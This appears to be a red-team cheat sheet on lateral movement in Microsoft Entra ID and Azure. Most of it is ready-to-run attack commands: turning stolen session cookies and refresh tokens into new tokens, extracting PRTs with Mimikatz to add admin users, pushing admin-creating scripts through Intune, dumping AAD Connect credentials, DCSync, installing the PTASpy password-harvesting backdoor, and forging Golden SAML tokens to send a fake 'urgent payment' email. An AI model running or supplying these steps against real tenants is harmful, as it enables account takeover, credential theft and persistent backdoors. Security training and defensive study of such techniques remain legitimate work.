# Lateral movement
* [General](#General)
  * [Access and RefreshTokens & Cookies](#Access-and-Refresh-Tokens-&-Cookies)
    * [Request access tokens](#Request-access-tokens)
    * [Stealing Access Tokens](/cloud/azure/post-exploitation.md#Stealing-tokens)
    * [From EST cookies to Access and Refresh tokens](#From-EST-cookies-to-Access-and-Refresh-tokens)
    * [Family of Client IDs (FOCI) FRT Abuse](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)
    * [JWT Assertion](#JWT-Assertion)
* [Entra ID To other machines](#Entra-ID-To-Other-Machines)
  * [Pass the certificate](#Pass-the-certificate)
  * [Pass the PRT](#Pass-the-PRT)
* [Entra ID To On-premises](#Entra-ID-To-On-Premises)
  * [Intune](#Intune)
  * [Application proxy abuse](#Application-proxy-abuse)
  * [Password write back](#Password-write-back)
* [On premises to Entra ID](#On-premises-to-Entra-ID)
  * [Azure AD Connect](#Azure-AD-Connect)
    * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
    * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
    * [Federation (ADFS)](#Federation-ADFS)
* [Tenant to Tenant](#Tenant-to-Tenant)
  * [Switch Directory](#Switch-Directory)
  * [Add guests](#Add-guests)
  * [Partner and solution providers](#Partner-and-solution-providers)

## General
### Access and Refresh Tokens & Cookies
- The Identity Platform (Entra ID) uses thee types of bearer tokens.
	- ID Token - Contains basic information about the user
		- Expiry is 1 hour
	- Access token - Used to get access to a resource. Prone to token replay attacks.
		- Expiry ranges from 70 minutes to 24 hours depending on type
		- Can't be revoked.
	- Refresh token - Can be used to request new access and ID Tokens.
		- Expiry is 90 days for inactive tokens, no expiry for active tokens.

#### Decode access token
- https://jwt.io
- You can get a lot of information about the access token such as the user, scope 
	- the provenance of the token (`iss`)
	- the resource owner and client application (`oid`/`upn`, `appid`)
	- the authorized scopes (`scp`)
	- the issuance and expiration times (`iat`, `exp`)
	- the resource server (`aud`)
	- the authentication methods that the resource owner used to authorize the client application (`amr`)

### Request access tokens
#### Using AZ Module
- Requires a refresh token or normal login

```
$AADGraphToken = (Get-AzAccessToken -ResourceTypeName AadGraph).Token

$ARMAccessToken = (Get-AzAccessToken -ResourceTypeName Arm).Token

$StorageAccessToken = (Get-AzAccessToken -ResourceTypeName Storage).Token

$KeyVault (Get-AzAccessToken -ResourceTypeName Storage).Token
```

#### TokenTactics
- Using Refresh token, `$tokens` variable from TokenTactics

```
$GraphAccessToken = (Invoke-RefreshToMSGraphToken -domain <DOMAIN>.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token

$ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicrosoft.com -refreshToken $response.refresh_token).access_token
```

#### Get other access tokens
- Abuses [FOCI](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)
```
Get-Command *Invoke-RefreshTo*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-RefreshToAzureCoreManagementToken           0.0.2      TokenTactics
Function        Invoke-RefreshToAzureManagementToken               0.0.2      TokenTactics
Function        Invoke-RefreshToDODMSGraphToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToGraphToken                         0.0.2      TokenTactics
Function        Invoke-RefreshToMAMToken                           0.0.2      TokenTactics
Function        Invoke-RefreshToMSGraphToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToMSManageToken                      0.0.2      TokenTactics
Function        Invoke-RefreshToMSTeamsToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeAppsToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeManagementToken              0.0.2      TokenTactics
Function        Invoke-RefreshToOutlookToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToSharepointOnlineToken              0.0.2      TokenTactics
Function        Invoke-RefreshToSubstrateToken                     0.0.2      TokenTactics
Function        Invoke-RefreshToYammerToken                        0.0.2      TokenTactics
```

### Stealing access tokens
- [Link to Post-Exploitation](/cloud/azure/post-exploitation.md#Stealing-tokens)

### From EST cookies to Access and Refresh tokens
### RoadTx
#### Get Access + Refresh Tokens
- https://github.com/dirkjanm/ROADtools
- Copy the `ESTSAUTHPERSISTENT` cookie from evilnginx2!
- Use the `--resource` parameter to choose which azure resource
	- `msgraph`    - https://graph.microsoft.com/
	- `aadgraph`   - https://graph.windows.net/
	- `azurerm`    - https://management.core.windows.net/
- Use the `--client` parameter to choose which client
	- `azps`, `azcli`, `msteams`, `edge`

```
roadtx interactiveauth --estscookie "0.Aa4Aq..." --resource msgraph

$GraphAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
```

#### Get access token info
```
roadtx describe
```
- Or decode it in https://jwt.io, get access token with `(cat .roadtools_auth| ConvertFrom-Json).accessToken`

#### Retrieve other access tokens
- Abuses [FOCI](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)
- Use the `--resource` parameter to choose which azure resource
	- `msgraph`    - https://graph.microsoft.com/
	- `aadgraph`   - https://graph.windows.net/
	- `azurerm`    - https://management.core.windows.net/

```
roadtx gettokens --refresh-token file --resource azurerm

$ARMAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
```

```
roadtx gettokens --refresh-token file --resource aadgraph

$AadGraphAccessToken = (cat .roadtools_auth| ConvertFrom-Json).accessToken
```

### TokenTactics
#### Get MSGraph Access Token
- https://github.com/rotarydrone/TokenTactics
- For some reason [TokenTacticsV2](https://github.com/f-bader/TokenTacticsV2) didn't work for me
- Copy the `ESTSAUTHPERSISTENT` cookie, also try the `ESTAUTH` cookie after!

```
Import-Module C:\Tools\Azure\TokenTacticsEST\TokenTactics\TokenTactics.psd1

Get-AzureTokenFromESTSCookie -ESTSAuthCookie "<ESTSAUTHPERSISTENT cookie>" -Client MSTeams
$response

$GraphAccessToken = $response.access_token
```

- From the response we can see its a FOCI token
```
...snip
foci           : 1
.../snip
```

#### Get other access tokens
- Abuses [FOCI](#Family-of-Client-IDs-(FOCI)-FRT-Abuse)

```
Get-Command *Invoke-RefreshTo*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-RefreshToAzureCoreManagementToken           0.0.2      TokenTactics
Function        Invoke-RefreshToAzureManagementToken               0.0.2      TokenTactics
Function        Invoke-RefreshToDODMSGraphToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToGraphToken                         0.0.2      TokenTactics
Function        Invoke-RefreshToMAMToken                           0.0.2      TokenTactics
Function        Invoke-RefreshToMSGraphToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToMSManageToken                      0.0.2      TokenTactics
Function        Invoke-RefreshToMSTeamsToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeAppsToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeManagementToken              0.0.2      TokenTactics
Function        Invoke-RefreshToOutlookToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToSharepointOnlineToken              0.0.2      TokenTactics
Function        Invoke-RefreshToSubstrateToken                     0.0.2      TokenTactics
Function        Invoke-RefreshToYammerToken                        0.0.2      TokenTactics
```

```
$GraphAccessToken = (Invoke-RefreshToMSGraphToken -domain <DOMAIN>.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token

$ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicrosoft.com -refreshToken $response.refresh_token).access_token
```

### Family of Client IDs (FOCI) FRT Abuse
- Family of Client IDs (FOCI) is a set of Microsoft client applications that are "compatible" with each other. "Family Refresh Token (FRT)" can be used to request refresh and access tokens for any other client applications in the family
	- Not bound to client_id or scope
	- Can be used to request refresh and access token of any client application in the family
	- Currently, there is only one family and it contains many "First-Party" Microsoft Applications with "public" client IDs - Office, Teams, Az CLI, Az PowerShell, Microsoft support, OneDrive etc.
		- The applications are in every tenant and do not require implied consent or pre-consent
	- Can not change privileges - Azure AD role based level of access cannot be changed
- Using a refresh token for ARM for Az PowerShell client id we can request tokens for MSGraph for office client id. Or the other way around
- https://github.com/secureworks/family-of-client-ids-research

#### Compatible clients
- https://github.com/secureworks/family-of-client-ids-research/blob/main/known-foci-clients.csv

#### Check FOCI in token
- If you have AccessTokens in a variable there is a attribute with the name `foci`
- If foci = 1 then its a FOCI access token and its possible to abuse FOCI
```
$tokens

token_type     : Bearer
scope          : ...snip...
expires_in     : ...snip...
ext_expires_in : ...snip...
access_token   : ...snip...
refresh_token  : ...snip...
foci           : 1
```

#### FOCI abuse TokenTactics
- https://github.com/rvrsh3ll/TokenTactics
- Example requests ARM access token
```
$ARMAccessToken = (Invoke-RefreshToAzureManagementToken -domain <COMPANY>.onmicrosoft.com -refreshToken $response.refresh_token).access_token

$ARMAccessToken
```

```
PS C:\> Get-Command *Invoke-RefreshTo*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-RefreshToAzureCoreManagementToken           0.0.2      TokenTactics
Function        Invoke-RefreshToAzureManagementToken               0.0.2      TokenTactics
Function        Invoke-RefreshToDODMSGraphToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToGraphToken                         0.0.2      TokenTactics
Function        Invoke-RefreshToMAMToken                           0.0.2      TokenTactics
Function        Invoke-RefreshToMSGraphToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToMSManageToken                      0.0.2      TokenTactics
Function        Invoke-RefreshToMSTeamsToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeAppsToken                    0.0.2      TokenTactics
Function        Invoke-RefreshToOfficeManagementToken              0.0.2      TokenTactics
Function        Invoke-RefreshToOutlookToken                       0.0.2      TokenTactics
Function        Invoke-RefreshToSharepointOnlineToken              0.0.2      TokenTactics
Function        Invoke-RefreshToSubstrateToken                     0.0.2      TokenTactics
Function        Invoke-RefreshToYammerToken                        0.0.2      TokenTactics
```

#### Request access tokens manually
- [Link to endpoints](/azure/readme.md#Endpoints)
- Using a refresh token in variable from TokenTactics/DeviceCode phish

```
$Endpoint = ""

$refresh_token = $tokens.refresh_token

$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Microsoft Office
$scope = $Endpoint
$GrantType = 'refresh_token'

$body=@{
	"client_id" = $ClientID
	"scope" = $Scope
	"refresh_token" = $refresh_token
	"grant_type" = $GrantType
}

$NewTokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body

$NewTokens

$NewAccessToken = $NewTokens.access_token
```

### JWT Assertion
- Sign assertions using the private key after stealing certificate of application and have longer expiry time then client secret (2 years)
- This can be used instead of token grant flows (request access tokens) instead of client secret.
- https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge

#### Load certificate
```
$clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\Users\Public\Cert.pfx'
```

#### Load function
```
# Taken from https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge

function New-AccessToken ($clientCertificate, $tenantID, $appID,
$scope='https://graph.microsoft.com/.default') {
$audience = "https://login.microsoftonline.com/$($tenantID)/oauth2/token"

# Create a base64 hash of the certificate. The Base64 encoded string must by urlencoded
$CertificateBase64Hash =
[System.Convert]::ToBase64String($clientCertificate.GetCertHash())
$CertificateBase64Hash = $CertificateBase64Hash -replace '\+','-' -replace '/','_' -replace '='

# JWT request should be valid for max 2 minutes.
$StartDate = (Get-Date "1970-01-01T00:00:00Z").ToUniversalTime()
$JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
$JWTExpiration = [math]::Round($JWTExpirationTimeSpan,0)

# Create a NotBefore timestamp.
$NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
$NotBefore = [math]::Round($NotBeforeExpirationTimeSpan,0)

# Create JWT header
$jwtHeader = @{
'alg' = "RS256" # Use RSA encryption and SHA256 as hashing algorithm
'typ' = "JWT" # We want a JWT
'x5t' = $CertificateBase64Hash # Webencoded Base64 of the hash of our certificate
}

# Create the payload
$jwtPayLoad = @{
'aud' = $audience # Points to oauth token request endpoint for your tenant
'exp' = $JWTExpiration # Expiration of JWT request
'iss' = $appID # The AppID for which we request a token for
'jti' = [guid]::NewGuid() # Random GUID
'nbf' = $NotBefore # This should not be used before this timestamp
'sub' = $appID # Subject
}

# Convert header and payload to json and to base64
$jwtHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
$jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
$b64JwtHeader = [System.Convert]::ToBase64String($jwtHeaderBytes)
$b64JwtPayload = [System.Convert]::ToBase64String($jwtPayloadBytes)

# Concat header and payload to create an unsigned JWT

$unsignedJwt = $b64JwtHeader + "." + $b64JwtPayload
$unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)

# Configure RSA padding and hashing algorithm, load private key of certificate and use it to sign the unsigned JWT

$privateKey = ([System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($clientCertificate))
$padding = [Security.Cryptography.RSASignaturePadding]::Pkcs1
$hashAlgorithm = [Security.Cryptography.HashAlgorithmName]::SHA256
$signedData = $privateKey.SignData($unsignedJwtBytes, $hashAlgorithm, $padding)

# Create a signed JWT by adding the signature to the unsigned JWT
$signature = [Convert]::ToBase64String($signedData) -replace '\+','-' -replace '/','_' -replace '='
$signedJWT = $unsignedJwt + "." + $signature

# Request an access token using the signed JWT
$uri = "https://login.microsoftonline.com/$($tenantID)/oauth2/v2.0/token"
$headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
$response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
'client_id' = $appID
'client_assertion' = $signedJWT
'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
'scope' = $scope
'grant_type' = 'client_credentials'
})
return $response.access_token
}
```

#### Craft JWT assertion, Request and sign Access token
- [Link to endpoints](/azure/readme.md#Endpoints)

```
$ARMAccessToken = New-AccessToken -clientCertificate $clientCertificate -tenantID <TENANT ID> -appID <APP ID> -scope 'https://management.azure.com/.default'
```

#### Login with access token
```
Connect-AzAccount -AccessToken $ARMAccessToken -AccountId <APP ID>
```

### JWT assertion - Key vault sign only permissions
- [Link to privesc page](/cloud/azure/privilege-escalation.md#JWT-assertion-Key-vault-sign-permissions)

## Entra ID To Other Machines
### Pass the certificate
- To go from Entra ID machine to other Entra ID machine if the user has administrative access to other machines.

#### Check if machine is Entra ID Joined
- Check for IsDeviceJoined : YES
```
dsregcmd /status
```

#### Extract PRT, Session key (keyvalue) and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```

#### Request a certificate from PRT
- https://github.com/morRubin/PrtToCert
- Code is modified in the lab
```
& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
```

#### Use certificate to add a user with administrative privileges
- Code is modified in the lab
- https://github.com/morRubin/AzureADJoinedMachinePTC
```
python \AzureADJoinedMachinePTC\Main.py --usercert <PATH TO .pfx FILE> --certpass AzureADCert --remoteip <TARGET IP> --command "cmd.exe /c net user <USERNAME> <PASSWORD> /add /Y && net localgroup administrators <USERNAME> /add"
```

#### Use psremoting to access the machine

### Pass the PRT
- PRT is a special refresh token used for single sign-on (SSO)!
  – It can be used to obtain access and refresh tokens to any application.
  – Issued to a user for a specific device
  – Valid for 90 days and is continuously renewed
  – CloudAP SSP requests and caches PRT on a device
  – If PRT is MFA-based (Windows Hello or Windows Account manager), then the claim is transferred to app tokens to prevent MFA challenge for every application.
  - If we compromise an Azure AD joined (or Hybrid joined) machine, it is possible to extract PRT and other keys for a user.
  - For Azure AD Registered machine, PRT is issued if a user has added a secondary work account to the device.
  - Before a fix in August 2021, PRT always had MFA claims. After fixes in August 2021, PRT can currently be extracted only for the current Azure AD user (not as a local admin or any other user).
  - If we have access to a PRT, it is possible to request access tokens for any application.
  - Chrome uses BrowserCore.exe to use PRT and request PRT cookie for SSO experience.
  - This PRT cookie - x-ms-RefreshTokenCredential – can be used in a browser to access any application as the user whose PRT we have.

#### Request a nonce
```
$TenantId = "<TENANT>"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI" = $URL
"Method" = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

#### Extract PRT
- Should be run on session of the targer Azure AD User
- https://github.com/dirkjanm/ROADtools
- https://aadinternals.com/aadinternals/
```
C:\AzAD\Tools\ROADToken.exe <nonce>
Get-AADIntUserPRTToken
````

#### Copy the value from above command and use it with a web browser
- Open the Browser in Incognito mode
- Go to https://login.microsoftonline.com/login.srf
- Press F12 (Chrome dev tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
- Can now also access portal.azure.com

## Entra ID To On Premises
### Intune
- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
- If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
- Go to Devices -> All Devices to check devices enrolled to Intune:
- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
- Example script adduser.ps1

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USERNAME> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member <USERNAME>
```

- Select `Run script in 64 bit PowerShell Host`
- On the assignment page select "Add all users" and "add all devices"

### Application proxy abuse
- The application behind the proxy may have vulnerabilities to access the on-prem environment.

#### Enumerate application which has a application proxy configured
```
Import-Module .\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Get the Service Principal (use the application name)
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"} 
```

#### Find user and groups assigned to the application
```
. .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

#### Extract secrets of service account
- After compromising the application
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

### Password write back
- Cloud sync supports password write-back to on-prem AD.
	- If a user with password reset role in Entra ID is compromised, they can reset password for synced user. If user has permissions in the on-prem AD.
	- Default security groups (for Example Domain admin) and their members are not synchronized.
		- `Admincount 1` accounts are not synced!
- There is no way to check if password writeback is enabled as a normal user.

#### Check synced users
- Browse to the Users tab in the portal and add a filter `On-premises sync enabled` to `yes`.

#### Reset the users password
- Reset the users password in the portal or [Check here]()

#### Start session as the user and check access
```
netexec smb <DC IP> -u <USER> -p <PASSWORD> -d <DOMAIN>

runas /netonly /user:<DOMAIN>\<USER> cmd
```

### DCSync with GMSA
- Is like the `MSOL_` user. The `pGMSA_<INSTALLATIONID` user has DCSync permissions
- Requires access to the Domain Controller

#### Retrieve GMSA account
```
Import-Module ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module ADModule-master\ActiveDirectory\ActiveDirectory.psd1

Get-ADServiceAccount -Filter * -Server <DOMAIN> | Where-Object -Property SamAccountName -Match pGMSA
```

#### Check who can request the password
```
Get-ADServiceAccount -Identity pGMSA_<ID> -Properties * -Server <DC IP> | select
PrincipalsAllowedToRetrieveManagedPassword
```

#### Overpass the Hash - Start session as DC account
```
Loader.exe -Path SafetyKatz.exe -args "sekurlsa::opassth /user:<DC ACCOUNT>$
/domain:<DOMAIN> /rc4:<NTLM HASH> /dc:<DC FQDN> /run:cmd.exe" "exit"
```

#### Retrieve password
```
$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<ID> -Properties msDS-ManagedPassword -server <DC IP>).'msDS-ManagedPassword'

Import-Module DSInternals.psd1

$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

#### Overpass the Hash - Start session as GMSA
```
Loader.exe -Path SafetyKatz.exe -args "sekurlsa::opassth /user:pGMSA_<ID>$ /domain:<DOMAIN> /ntlm:<NTLM HASH> /DC:<DC FQDN> /run:cmd.exe" "exit"
```

#### Run DCSync
```
Loader.exe -Path SafetyKatz.exe -args "lsadump::dcsync /user:<DOMAIN>/Administrator /domain:<DOMAIN> /DC:<DC FQDN>" "exit"
```

## On premises to Entra ID
- https://aadinternals.com/post/on-prem_admin/

### Azure AD Connect
- When Azure AD Connect is configured. The `SYNC_` account and `MSOL_` account are created. (or `AAD_` if installed on a DC)
- The `SYNC_` account has the role `Directory Synchronization Accounts` and can reset any password within the cloud and the `MSOL_` and `AAD_` account have DCSync rights.
- The role is now shown in the Azure portal [Documentation](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#roles-not-shown-in-the-portal)
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
- A lot of the attacks uses https://github.com/Gerenios/AADInternals

#### Enumerate server where Azure AD connect is installed (on prem command)
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

#### Enumerate server where Azure AD connect is installed (Azure command)
```
Import-Module .\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Check if AD Connect is installed on the server
```
Get-ADSyncConnector
```

#### Dumping AAD Connect credentials
- If it fails check if the service is running
```
Import-Module .\AADInternals.psd1
Get-AADIntSyncCredentials
```

- Or use https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c#file-azuread_decrypt_msol_v2-ps1
```
powershell.exe -f C:\users\public\azuread_decrypt_msol_v2.ps1
```

#### Error
- If the error `[!] Could not connect to localdb...` shows. Change the SQL Instance name
```
Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
Get-ADSyncDatabaseConfiguration
```
- Edit line 4 of the script

### Password Hash Sync Abuse
#### Turn on password hash sync
- AAD Connect service account can turn on Password hash sync
```
Set-AADIntPasswordHashSyncEnabled -Enabled $true
```

### Abusing On-Prem MSOL_ Account
#### Run DCSync with creds of MSOL_* account
```
runas /netonly /user:<DOMAIN>\MSOL_<ID> cmd 
Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
```

### Reset password of cloud user
- Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

#### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
```
Import-Module .\AADInternals.psd1
$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

#### Enumerate global admin
```
Get-AADIntGlobalAdmins
```

#### Get the ImmutableID
```
Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
Get-AADIntUsers | Select UserPrincipalName,ImmutableId,ObjectId | Sort UserPrincipalName
```

#### Reset the Azure password
```
Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Verbose
```

#### Reset password for cloud only user
- Need CloudAnchor ID which is the format ```<USER>_<OBJECTID>```
- Might be fixed already!
```
Import-Module .\AADInternals.psd1
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
```

- Access Azure portal using the new password.

### Pass Through Authentication PTA Abuse
- Once we have admin access to an Azure AD connect server running PTA agent.
- Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
- Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!

#### Install a backdoor (needs to be run as administrator)
- Creates a hidden folder `C:\PTASpy` and Copies a `PTASpy.dll` to `C:\PTASpy` and Injects `PTASpy.dll` to AzureADConnectAuthenticationAgentService process
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

### See passwords of on-prem users authenticating
- Stored in `C:\PTASpy`
```
Import-Module .\AADInternals.psd1
Get-AADIntPTASpyLog
Get-AADIntPTASpyLog -DecodePasswords
```

#### Register a new PTA agent for persistence
- After getting Global Administrator privileges by setting it on a attacker controled machine.
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

### Federation-ADFS
- ADFS = Active Directory Federation Services
- Golden SAML Attack

#### Get the ImmutableID
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

#### Get the AD FS identifier issuer:
```
Get-AdfsProperties | select identifier
```

#### Can check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
```
Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
```

#### Extract the ADFS token signing certificate
- If no file name is given, the certificate is exported to the current directory as ADFSSigningCertificate.pfx with empty pfx password.
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Access cloud apps as any user
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
```

#### Create SAML Token
```
$saml=New-AADIntSAMLToken -ImmutableID <IMMUTABLE ID> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -PfxPassword "" -Issuer <ISSUER>
```

#### Get OAUTH access token used with AADInternal functions
```
$at=Get-AADIntAccessTokenForEXO -SAMLToken $saml
```

#### Send a message using "Outlook"
```
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```

### Creating tokens for cloud-only users
#### Create a realistic ImmutableID
```
$ImmutableID = [System.Convert]::ToBase64String((New-Guid).tobytearray())
```

#### Set ImmutableID
```
Set-AADIntAzureADObject -CloudAnchor "User_7b0ad665-a751-43d7-bb9a-7b8b1e6b1c59" -SourceAnchor $ImmutableID
```

#### Export the token signing certificate
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <ISSUER> -PfxFileName <PATH TO ADFSSigningCertificate.pfx> -Verbose
```

## Tenant to Tenant
- Cross tenant default access settings (Overwritten by Organizational settings)
	- B2B collaboration is enabled by default
	- B2B direct is disabled
	- Cross-tenant synchronization is not enabled (Sync users from other tenant)
- Cross tenant organizational settings
	- Both inbound and outbound allow automatic redemption (Suppress consent prompt when accessing resources of other tenant if both inbound and outbound has it configured)

### Switch Directory
#### Check if user has access to other tenants
- Right click the user in the top and click "Switch Directory"
- Or browse to https://myaccount.microsoft.com/organizations

#### Switch directory
- Choose the other tenant and switch

#### Check Cross Tenant policy
-  Requires `Policy.Read.All` permissions

```
Get-MgPolicyCrossTenantAccessPolicyPartner | ConvertTo-Json
```

"Also, as of February 2024, there is no way to enumerate Cross-tenant Synchronization using Mg module or MSGraph API. Enumerating cross-tenant synchronization would allow us to see which users and groups are synchronized across tenants:"

### Add guests
- Find a web application that allows Self service sign-up for B2B collaboration.
- Use the "create one" feature and login using a MS account

### Partner and solution providers
- If you compromise a tenant which is partner to another tenant possible to access their tenant
- Partner and Solution providers types
	- Advisor - Partners can reset password and handle support incidents
		- Global Admin and HelpDesk Admin
	- Granular delegated administrator privileges - Successor to much abused DAP. Use to mange Azure resources but limited access in the Microsoft 365 Admin center
		- Any Entra Role
	- Partner - Used to manage services in Microsoft 365 admin center
		- Any Admin role in Microsoft 365 admin center
- Partner Centre: https://partner.microsoft.comdashboard/home - Provides the granular DAP and other access
- Azure Lighthouse - Provides more granular access to Azure resources (Not Microsoft 365 Lighthouse)
	- Subscriptions and resources groups can be delegated to specific users and roles in service providers tenant without having to sign in to the target tenant
	- Blocks many privileged roles

#### Abusing LightHouse
- Overly permissive roles can still be abused. Roles with unintentional data access.
	- MS example: Virtual Machine Contributor can read access keys of the storage account and access the storage account data with the key.
- Compromising a user with permissions could result in the compromise of the resource they manage.

#### Check for LigtHouse
- The output will show `HomeTenantId` and `TenantId` and `ManagedByTenantIds`

```
Get-AzSubscription | fl 

Get-AzSubscription | Select-Object -ExpandProperty ExtendedProperties
```

#### List Azure Lighthouse registration assignments in a subscription
```
Get-AzManagedServicesAssignment
```

#### Get domain name of tenant ID
- Create a CA, under Users -> Selected users and Groups -> Guest or External users -> Specify external Microsoft Entra organizations -> Enter tenant ID

#### See Privesc section for abuses for specific roles / resources
- Link
